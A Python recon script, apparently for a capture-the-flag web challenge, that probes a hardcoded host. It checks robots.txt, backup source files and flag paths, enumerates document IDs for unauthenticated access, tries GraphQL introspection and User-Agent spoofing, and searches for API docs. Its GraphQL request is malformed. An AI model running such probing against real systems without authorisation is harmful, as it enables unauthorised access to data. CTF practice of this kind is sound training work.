#!/usr/bin/env python3
"""
Alternative attack vector - maybe the vuln isn't in login at all
"""

import requests
import re

BASE_URL = "http://138.199.163.92:16969"

print("="*60)
print("ALTERNATIVE ATTACK VECTORS")
print("="*60)

# Maybe the flag is accessible without authentication through some other means

# 1. Check if robots.txt has hints
print("\n[*] Checking robots.txt...")
resp = requests.get(f"{BASE_URL}/robots.txt")
if resp.status_code == 200:
    print(resp.text)
    # Look for disallowed paths
    for line in resp.text.split('\n'):
        if 'Disallow:' in line:
            path = line.split('Disallow:')[1].strip()
            print(f"  Trying disallowed path: {path}")
            r = requests.get(f"{BASE_URL}{path}")
            if r.status_code == 200:
                print(f"    [!] Accessible: {r.text[:200]}")

# 2. Check sitemap
print("\n[*] Checking sitemap.xml...")
resp = requests.get(f"{BASE_URL}/sitemap.xml")
if resp.status_code == 200:
    print(resp.text[:500])

# 3. Check for backup files of the application
print("\n[*] Checking for backup files...")
backup_files = [
    '/app.py.bak',
    '/app.py~',
    '/app.py.old',
    '/main.py.bak',
    '/server.py.bak',
    '/login.py.bak',
    '/auth.py.bak',
    '/.app.py.swp',
    '/app.pyc',
    '/__pycache__/app.cpython-311.pyc',
]

for file in backup_files:
    resp = requests.get(f"{BASE_URL}{file}")
    if resp.status_code == 200:
        print(f"  [!!!] FOUND: {file}")
        print(f"       {resp.text[:300]}")

# 4. Check for common CTF flag locations
print("\n[*] Checking common flag locations...")
flag_paths = [
    '/flag.txt',
    '/flag',
    '/.flag',
    '/secret.txt',
    '/secret',
    '/key.txt',
    '/admin/flag',
    '/api/flag',
    '/vault/flag',
    '/documents/flag',
]

for path in flag_paths:
    resp = requests.get(f"{BASE_URL}{path}")
    if resp.status_code == 200 and 'Kaal{' in resp.text:
        print(f"  [!!!] FLAG FOUND AT {path}:")
        print(f"       {resp.text}")

# 5. Check if there's a public document we can access
print("\n[*] Trying public document access...")
for i in range(0, 100):
    resp = requests.get(f"{BASE_URL}/document/{i}", allow_redirects=False)
    if resp.status_code == 200:
        print(f"  [!] Document {i} accessible!")
        print(f"      {resp.text[:200]}")
        if 'Kaal{' in resp.text:
            print(f"      [!!!] FLAG: {resp.text}")

# 6. Check for GraphQL endpoint
print("\n[*] Checking for GraphQL...")
graphql_query = '{"query": "{__schema{types{name}}}"}'
resp = requests.post(f"{BASE_URL}/graphql", json={'query': graphql_query})
if resp.status_code == 200:
    print(f"  [!] GraphQL found: {resp.text[:300]}")

# 7. Try accessing with different User-Agents
print("\n[*] Trying different User-Agents...")
user_agents = [
    'Googlebot/2.1',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'curl/7.64.1',
    'python-requests/2.25.1',
]

for ua in user_agents:
    headers = {'User-Agent': ua}
    resp = requests.get(f"{BASE_URL}/api/search", headers=headers)
    if resp.status_code != 401:
        print(f"  [!] UA '{ua[:30]}' got {resp.status_code}")
        print(f"      {resp.text[:200]}")

# 8. Check if there's a public API documentation
print("\n[*] Checking for API docs...")
doc_paths = [
    '/api/docs',
    '/api/documentation',
    '/docs',
    '/swagger',
    '/swagger.json',
    '/openapi.json',
    '/api.json',
    '/redoc',
]

for path in doc_paths:
    resp = requests.get(f"{BASE_URL}{path}")
    if resp.status_code == 200:
        print(f"  [!] Found: {path}")
        print(f"      {resp.text[:300]}")

print("\n[*] Alternative attack vectors exhausted!")
